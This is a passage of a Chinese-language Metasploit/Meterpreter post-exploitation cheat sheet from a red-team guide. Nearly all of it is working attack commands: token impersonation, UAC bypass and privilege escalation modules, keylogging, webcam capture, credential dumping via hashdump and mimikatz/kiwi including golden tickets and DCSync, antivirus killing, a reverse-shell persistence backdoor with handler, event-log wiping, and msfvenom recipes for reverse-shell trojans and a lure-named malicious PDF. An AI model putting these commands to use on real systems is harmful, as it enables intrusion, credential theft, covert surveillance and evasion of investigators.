*   run autoroute -s 192.168.0.1/24
*   打印添加的路由
*   run autoroute –p
*   删除路由
*   run autoroute -d -s 192.168.0.1/24

#### [execute执行文件](#toc_execute)

在目标机中执行文件

execute

创建新进程cmd.exe，-H不可见，-i交互

execute -H -i -f cmd.exe

-f：指定可执行文件

-H：创建一个隐藏进程

-a：传递给命令的参数

-i：跟进程进行交互

-m：从内存中执行

-t： 使用当前伪造的线程令牌运行进程

-s： 在给定会话中执行进程

#### [migrate转移进程](#toc_migrate)

获取当前进程PID getpid

获取进程列表 ps

转移进程 migrate PID

杀死进程 kill PID

自动进程迁移 run post/windows/manage/migrate

监听设置自动转移进程 set autorunscript migrate -f

#### [令牌窃取](#toc__23)

使用模块 use incognito

查看可用token list_tokens -u

假冒SYSTEM权限 impersonate_token 'NT AUTHORITY\SYSTEM'

利用假冒身份执行命令 execute -f cmd.exe -i –t

或者直接shell即可

返回原始权限 rev2self

#### [提权相关](#toc__24)

加载特权提升扩展模块 use priv

获取更多的特权 getprivs

查看补丁信息 run post/windows/gather/enum_patches

可利用exp提权检测 use post/multi/recon/local_exploit_suggester

系统服务权限配置错误 use exploit/windows/local/service_permissions

注册表键配置错误提取 use exploit/windows/local/always_install_elevated

可信任服务路径 use exploit/windows/local/trusted_service_path

#### [bypassuac](#toc_bypassuac)

use exploit/windows/local/bypassuac

use exploit/windows/local/bypassuac_injection

use windows/local/bypassuac_vbs

use windows/local/ask

#### [键盘鼠标设置](#toc__25)

禁用鼠标 uictl disable mouse

禁用键盘 uictl disable keyboard

启用鼠标 uictl enable mouse

启用键盘 uictl enable keyboard

键盘记录

[开始键盘记录](#toc__26)
==================

keyscan_start

[导出记录数据](#toc__27)
==================

keyscan_dump

[结束键盘记录](#toc__28)
==================

keyscan_stop

#### [信息搜集](#toc__29)

查看当前目录 pwd getwd

查看目标主机信息 sysinfo

检查目标机器闲置时间 idletime

获取代理信息

getproxy

查看目标主机是否运行在虚拟机上

run checkvm run post/windows/gather/checkvm

获取主机安装软件、补丁

run post/windows/gather/enum_applications

获取目标主机环境变量

run post/multi/gather/env

获取IE缓存

run post/windows/gather/enum_ie

获取Chrome缓存

run post/windows/gather/enum_chrome

获取Firefox缓存

run post/windows/gather/enum_firefox

列举当前登录的用户

run post/windows/gather/enum_logged_on_users

查找域控

run post/windows/gather/enum_domain

Windows凭证搜索

run post/windows/gather/enum_unattend

获取办公文档

run post/windows/gather/dumplinks

获取目标常见信息并保存到本地 run scraper

屏幕截图

screenshot

#### [密码获取](#toc__30)

抓取自动登录的用户名和密码

run post/windows/gather/credentials/windows_autologin

hashdump

run post/windows/gather/smart_hashdump

#### [mimikatz](#toc_mimikatz)

老版

加载 load mimikatz

获取hash值 msv

获取明文 Kerberos

获取系统账户信息 wdigest

新版

加载kiwi模块：

```
load kiwi 
```

列举系统中的明文密码：

```
creds_all 
```

creds_all： #列举所有凭据  
creds_kerberos： #列举所有kerberos凭据  
creds_msv： #列举所有msv凭据  
creds_ssp： #列举所有ssp凭据  
creds_tspkg： #列举所有tspkg凭据  
creds_wdigest： #列举所有wdigest凭据  
dcsync： #通过DCSync检索用户帐户信息  
dcsync_ntlm： #通过DCSync检索用户帐户NTLM散列、SID和RID  
golden_ticket_create： #创建黄金票据  
kerberos_ticket_list： #列举kerberos票据  
kerberos_ticket_purge： #清除kerberos票据  
kerberos_ticket_use： #使用kerberos票据  
kiwi_cmd： #执行mimikatz的命令，后面接mimikatz.exe的命令  
lsa_dump_sam： #dump出lsa的SAM  
lsa_dump_secrets： #dump出lsa的密文  
password_change： #修改密码  
wifi_list： #列出当前用户的wifi配置文件  
wifi_list_shared： #列出共享wifi配置文件/编码

**kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令:**

kiwi_cmd sekurlsa::logonpasswords

![image-20220205000038842.png](https://storage.tttang.com/media/attachment/2022/02/05/2244ef9e-6a1b-4900-851b-a6c5b209a0c7.png)

#### [获取域散列值](#toc__31)

#使用psexec_ntdsgrab模块

use auxiliary/admin/smb/psexec_ntdsgrab

set RHOST set SMBDomain

set SMBUser

set SMBPass

[基于meterpreter会话](#toc_meterpreter)
===================================

use windows/gather/credentials/domain_hashdump

set session ID

#### [流量抓取](#toc__32)

查看网卡信息

run packetrecorder -L

查看流量

run packetrecorder -i <网卡ID>

#### [端口扫描、主机发现](#toc__33)

使用arp发现主机

run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24

扫描tcp端口

run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389

#### [防火墙、杀软](#toc__34)

关闭杀软 run killav

查看防火墙状态 run getcountermeasure

在shell中使用

netsh firewall show opmode

#### [PowerShell](#toc_powershell)

加载脚本模块

powershell_import /root/Desktop/HostRecon.ps1

执行加载的脚本

powershell_execute Invoke-HostRecon

#### [Hash传递](#toc_hash)

use exploit/windows/smb/psexec

#### [摄像头、屏幕](#toc__35)

查看摄像头信息 webcam_list

使用摄像头拍照 webcam_snap

屏幕监视 run vnc

#### [开启远程桌面](#toc__36)

开启远程桌面

run post/windows/manage/enable_rdp

添加用户

run post/windows/manage/enable_rdp USERNAME=gugugu PASSWORD=Root123456789

将3389端口转发到6662端口

run post/windows/manage/enable_rdp FORWARD=true LPORT=6662

#### [cmdshell升级](#toc_cmdshell)

查看全部会话 sessions

选择会话1 sessions 1

升级meterpreter sessions -u 会话id

#### [持久化控制后门](#toc__37)

run persistence -X -i 50 -p 4444 -r 192.168.1.7

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.109.137

set LPORT 4444

exploit

#### [针对linux平台](#toc_linux)

目标主机保存的ssh身份验证信息

run post/multi/gather/ssh_creds

#### [擦屁股、清痕迹](#toc__38)

删除添加的账号

C:\Windows\system32> net user 添加的用户名 /del

删除日志

clearev

关闭所有session连接

sessions -K

事件日志

查看事件日志

run event_manager -i

清除事件日志

run event_manager -c

#### [msf生成木马教程](#toc_msf_6)

##### [生成木马命令：`msfvenom`](#toc_msfvenom_1)

msfcenom详细语法  
-e, –encoder [encoder] 指定需要使用的encoder（编码器）  
-a, –arch < architecture> 指定payload的目标架构  
–platform < platform> 指定payload的目标平台  
-s, –space < length> 设定有效攻击荷载的最大长度  
-b, –bad-chars < list> 设定规避字符集，比如: & #039;\x00\xff& #039;  
-i, –iterations < count> 指定payload的编码次数  
-c, –add-code < path> 指定一个附加的win32 shellcode文件  
-x, –template < path> 指定一个自定义的可执行文件作为模板  
-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行  
–payload-options 列举payload的标准选项  
-o, –out < path> 保存payload  
-v, –var-name < name> 指定一个自定义的变量，以确定输出格式  
–shellest 最小化生成payload  
-h, –help 查看帮助选项  
–help-formats 查看msf支持的输出格式列表

##### [生成木马语句](#toc__39)

二进制  
linux:msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf

windows:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe

mac: msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho

web  
php:msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo '<?php ’ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php

asp:msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp

jap:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

war:msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war

脚本  
python:msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py

bash:msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh

perl:msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl

基于pdf的shellcode  
use exploit/windows/fileformat/adobe_utilprintf  
msf5 exploit(adobe_utilprintf)>set FILENAME BestComputers-UpgradeInstructions.pdfset

PAYLOAD windows/meterpreter/reverse_tcp  
其他的就自己填就好了

参考：

[https://blog.csdn.net/weixin_46789316/article/details/112135904](https://blog.csdn.net/weixin_46789316/article/details/112135904)

[https://blog.csdn.net/hackzkaq/article/details/120825347](https://blog.csdn.net/hackzkaq/article/details/120825347)

渗透攻击红队msf系列

pdf在：[https://github.com/txluck/MSF_operation_guide](https://github.com/txluck/MSF_operation_guide)  
有错的地方 不足的地方请师傅们指出：  
[https://github.com/txluck/MSF_operation_guide/issues](https://github.com/txluck/MSF_operation_guide/issues)